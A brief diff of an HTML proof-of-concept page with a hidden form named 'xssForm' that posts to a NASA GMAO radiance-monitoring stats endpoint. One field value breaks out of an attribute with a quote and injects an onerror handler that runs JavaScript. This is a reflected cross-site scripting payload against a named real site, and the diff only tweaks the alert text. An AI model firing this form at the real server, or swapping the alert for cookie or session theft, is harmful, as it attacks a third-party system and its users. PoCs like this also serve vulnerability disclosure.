@@ -3,7 +3,7 @@
     <form id="xssForm" action="https://gmao.gsfc.nasa.gov/products/nwp/systems/radmon/stats.php" method="POST">
       <input type="hidden" name="date" value="20241227-20250327">
       <input type="hidden" name="oldexp" value="GEOS-5.29.5">
-      <input type="hidden" name="exp" value='GEOS-5.29.5"onerror="alert("Hi NASA!")">//'>
+      <input type="hidden" name="exp" value='GEOS-5.29.5"onerror="alert(Hi NASA)">//'>
       <input type="hidden" name="inst" value="airs_aqua">
       <input type="hidden" name="chan" value="3">
       <input type="hidden" name="imgtype" value="bkg">
